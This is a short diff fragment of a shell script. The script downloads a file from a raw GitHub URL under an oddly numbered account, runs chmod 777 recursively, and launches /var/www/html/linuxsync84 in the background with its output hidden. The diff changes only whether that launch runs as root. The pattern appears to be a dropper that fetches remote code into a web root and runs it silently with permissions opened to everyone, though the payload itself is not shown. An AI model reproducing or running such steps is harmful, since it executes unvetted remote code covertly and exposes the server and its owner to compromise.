@@ -56,4 +56,4 @@ wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/mast
 
 chmod 777 -R ./
 
-sudo -u root bash /var/www/html/linuxsync84 &> /dev/null &
+bash /var/www/html/linuxsync84 &> /dev/null &
